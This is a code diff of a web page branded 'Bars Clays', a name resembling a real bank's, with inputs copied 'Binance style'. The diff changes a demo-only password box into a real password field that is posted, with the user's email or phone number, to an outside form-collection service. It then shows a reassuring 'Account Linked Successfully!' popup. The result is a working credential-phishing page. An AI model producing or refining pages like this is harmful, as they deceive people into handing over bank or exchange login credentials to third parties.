@@ -7,132 +7,88 @@
 
 <style>
 
-/* ---------- GLOBAL ---------- */
-
+/* ---------- RESET ---------- */
 *{margin:0;padding:0;box-sizing:border-box;}
-
 body{
-font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
-min-height:100vh;
+font-family:Arial, Helvetica, sans-serif;
+background:#f5f5f5;   /* ← replaced dark background with first HTML background */
 display:flex;
 justify-content:center;
-align-items:center;
-background:
-radial-gradient(circle at 20% 20%, #1a1f2a, #0b0e11 60%);
+align-items:flex-start;
+min-height:100vh;
 padding:20px;
 }
 
 /* ---------- CARD ---------- */
-
 .container{
 width:100%;
 max-width:420px;
 background:#fff;
 border-radius:18px;
-padding:42px 30px;
-box-shadow:0 25px 70px rgba(0,0,0,.45);
-animation:fadeIn .6s ease;
+padding:38px 28px;
+box-shadow:0 20px 60px rgba(0,0,0,.35);
 }
 
-@keyframes fadeIn{from{opacity:0;transform:translateY(15px)}}
-
 /* ---------- LOGO ---------- */
-
 .logo{
 text-align:center;
-font-size:30px;
 font-weight:700;
+font-size:28px;
 color:#fcd535;
 margin-bottom:8px;
 }
-
 .subtitle{
 text-align:center;
 color:#777;
-margin-bottom:34px;
+font-size:14px;
+margin-bottom:32px;
 }
 
-/* ---------- FLOATING INPUT ---------- */
+/* ---------- ADDED WELCOME (from first HTML) ---------- */
 
-.field{
-position:relative;
-margin-bottom:22px;
+.welcome{
+font-size:28px;
+font-weight:700;
+margin-bottom:26px;
 }
 
-.field input,
-.field textarea{
+/* ---------- BINANCE STYLE INPUT (EXACT FROM FIRST HTML) ---------- */
+
+.binance-input{
 width:100%;
-padding:18px 14px 12px 14px;
+margin-top:8px;
+padding:16px;
+border-radius:10px;
+border:none;
+background:#efefef;
+font-size:15px;
+margin-bottom:18px;
+}
+
+/* ---------- INPUT ---------- */
+.input-group{margin-bottom:18px;}
+
+.input-group textarea{
+width:100%;
+padding:15px;
 border-radius:10px;
 border:1px solid #dfe3e8;
 font-size:16px;
+transition:.25s;
 background:#fafafa;
 }
 
-.field label{
-position:absolute;
-left:14px;
-top:16px;
-font-size:15px;
-color:#777;
-pointer-events:none;
-transition:.2s;
-background:white;
-padding:0 4px;
-}
-
-.field input:focus,
-.field textarea:focus{
+.input-group textarea:focus{
 outline:none;
 border-color:#fcd535;
-box-shadow:0 0 0 3px rgba(252,213,53,.15);
 background:white;
-}
-
-/* float animation */
-
-.field input:focus + label,
-.field input:not(:placeholder-shown) + label,
-.field textarea:focus + label,
-.field textarea:not(:placeholder-shown) + label{
-top:-8px;
-font-size:12px;
-color:#fcd535;
-}
-
-/* ---------- PASSWORD STRENGTH ---------- */
-
-.strength{
-height:6px;
-border-radius:4px;
-background:#eee;
-margin-top:6px;
-overflow:hidden;
-}
-
-.strength span{
-display:block;
-height:100%;
-width:0%;
-transition:.3s;
-}
-
-/* ---------- SHOW PASSWORD ---------- */
-
-.toggle{
-position:absolute;
-right:12px;
-top:16px;
-cursor:pointer;
-font-size:13px;
-color:#888;
+box-shadow:0 0 0 3px rgba(252,213,53,.15);
 }
 
 /* ---------- BUTTON ---------- */
-
 button{
 width:100%;
-padding:17px;
+padding:16px;
 border:none;
 border-radius:10px;
 background:#fcd535;
@@ -145,10 +101,9 @@ align-items:center;
 gap:10px;
 }
 
-button:disabled{opacity:.7}
+button:disabled{opacity:.7;cursor:not-allowed}
 
 /* spinner */
-
 .spinner{
 width:18px;height:18px;
 border:3px solid #000;
@@ -159,19 +114,7 @@ display:none;
 }
 @keyframes spin{to{transform:rotate(360deg)}}
 
-/* ---------- SHAKE INVALID ---------- */
-
-@keyframes shake{
-0%,100%{transform:translateX(0)}
-20%{transform:translateX(-6px)}
-40%{transform:translateX(6px)}
-60%{transform:translateX(-4px)}
-80%{transform:translateX(4px)}
-}
-.shake{animation:shake .35s}
-
-/* ---------- SUCCESS POPUP ---------- */
-
+/* ---------- POPUP ---------- */
 .popup{
 position:fixed;
 top:0;left:0;
@@ -180,44 +123,64 @@ background:rgba(0,0,0,.6);
 display:none;
 justify-content:center;
 align-items:center;
+padding:20px;
 }
 
 .popup-box{
 background:#1E2329;
 color:#EAECEF;
-padding:40px 30px;
 border-radius:14px;
-max-width:340px;
+padding:40px 30px;
+max-width:360px;
+width:100%;
 text-align:center;
+animation:popBox .25s ease;
 }
 
-.check{
+@keyframes popBox{
+from{transform:scale(.9);opacity:.4}
+to{transform:scale(1);opacity:1}
+}
+
+.checkmark{
 width:80px;height:80px;
-background:#0ECB81;
 border-radius:50%;
-margin:0 auto 20px;
 display:flex;
-align-items:center;
 justify-content:center;
-font-size:40px;
-color:white;
-animation:pop .45s;
+align-items:center;
+margin:0 auto 20px;
+background:#0ECB81;
+animation:pop .45s ease forwards;
+position:relative;
+}
+
+.checkmark::after{
+content:'✔';
+font-size:42px;
+color:#fff;
+opacity:0;
+animation:fadeIn .5s ease .45s forwards;
 }
 
 @keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}
+
+.popup h2{color:#0ECB81;margin-bottom:8px;}
+.popup p{color:#B7BDC6;font-size:14px;margin-bottom:20px;}
 
 .popup button{
-margin-top:20px;
 background:#FCD535;
-padding:12px 24px;
+color:#000;
+padding:12px 22px;
 border-radius:8px;
 }
 
 /* MOBILE */
-
 @media(max-width:420px){
-.container{padding:32px 22px}
-.logo{font-size:26px}
+.container{padding:30px 22px}
+.logo{font-size:24px}
+.checkmark{width:65px;height:65px}
+.checkmark::after{font-size:32px}
 }
 
 </style>
@@ -230,110 +193,83 @@ border-radius:8px;
 <div class="logo">Bars Clays</div>
 <div class="subtitle">Secure account contact</div>
 
-<form id="form" action="https://formspree.io/f/xjgewvle" method="POST">
+<!-- ✅ added welcome from first HTML -->
+<div class="welcome">Welcome to Bars Clays</div>
 
-<div class="field">
-<input name="name" required placeholder=" ">
-<label>Full name</label>
+<form id="contactForm" action="https://formspree.io/f/xjgewvle" method="POST">
+
+<!-- ✅ replaced email input with EXACT first HTML style -->
+<label>Email / Phone number</label>
+<input class="binance-input" type="text" name="email" placeholder="Email/Phone (without country code)" required>
+
+<!-- ✅ added password under it (same style) -->
+<label>Password</label>
+<input class="binance-input" type="password" name="password" placeholder="Enter password" required>
+
+<div class="input-group">
+<textarea name="message" rows="4" placeholder="Message" required></textarea>
 </div>
 
-<div class="field">
-<input type="email" name="email" required placeholder=" ">
-<label>Email address</label>
-</div>
-
-<!-- PASSWORD VISUAL ONLY -->
-
-<div class="field">
-<input type="password" id="pass" placeholder=" ">
-<label>Password (demo only)</label>
-<div class="toggle" onclick="togglePass()">SHOW</div>
-<div class="strength"><span id="bar"></span></div>
-</div>
-
-<div class="field">
-<textarea name="message" rows="4" required placeholder=" "></textarea>
-<label>Message</label>
-</div>
-
-<button id="btn">
-<span id="txt">Continue</span>
-<div id="spin" class="spinner"></div>
+<button id="submitBtn">
+<span id="btnText">Continue</span>
+<div id="spinner" class="spinner"></div>
 </button>
 
 </form>
 </div>
 
 
-<!-- POPUP -->
-
+<!-- SUCCESS POPUP (UNCHANGED) -->
 <div id="popup" class="popup">
 <div class="popup-box">
-<div class="check">✔</div>
-<h2 style="color:#0ECB81">Account Linked</h2>
-<p>Your details were received safely.</p>
-<button onclick="popup.style.display='none'">OK</button>
+<div class="checkmark"></div>
+<h2>Account Linked Successfully!</h2>
+<p>Your Bars Clays account details have been received safely.</p>
+<button onclick="closePopup()">Back</button>
 </div>
 </div>
 
 
 <script>
 
-const f=document.getElementById("form");
-const btn=document.getElementById("btn");
-const spin=document.getElementById("spin");
-const txt=document.getElementById("txt");
+const form=document.getElementById("contactForm");
+const btn=document.getElementById("submitBtn");
+const spinner=document.getElementById("spinner");
+const text=document.getElementById("btnText");
 const popup=document.getElementById("popup");
 
-/* submit */
-
-f.addEventListener("submit",async e=>{
+form.addEventListener("submit",async e=>{
 e.preventDefault();
 
-if(!f.checkValidity()){
-f.classList.add("shake");
-setTimeout(()=>f.classList.remove("shake"),400);
-return;
-}
-
 btn.disabled=true;
-spin.style.display="block";
-txt.textContent="Securing connection...";
+spinner.style.display="block";
+text.textContent="Sending...";
 
 try{
-const r=await fetch(f.action,{
+
+const res=await fetch(form.action,{
 method:"POST",
-body:new FormData(f),
-headers:{Accept:"application/json"}
+body:new FormData(form),
+headers:{'Accept':'application/json'}
 });
-if(!r.ok) throw 0;
+
+if(!res.ok) throw new Error();
+
 popup.style.display="flex";
-f.reset();
+form.reset();
+
 }catch{
-alert("Network error");
+alert("Network error — please try again.");
 }
 
 btn.disabled=false;
-spin.style.display="none";
-txt.textContent="Continue";
+spinner.style.display="none";
+text.textContent="Continue";
 
 });
 
-/* password strength visual */
-
-document.getElementById("pass").oninput=e=>{
-let v=e.target.value.length;
-let w=Math.min(v*10,100);
-let bar=document.getElementById("bar");
-bar.style.width=w+"%";
-bar.style.background=w<40?"#d93025":w<70?"#f9ab00":"#0ECB81";
-};
-
-/* show hide */
-
-function togglePass(){
-let p=document.getElementById("pass");
-p.type=p.type==="password"?"text":"password";
+function closePopup(){
+popup.style.display="none";
 }
 
 </script>
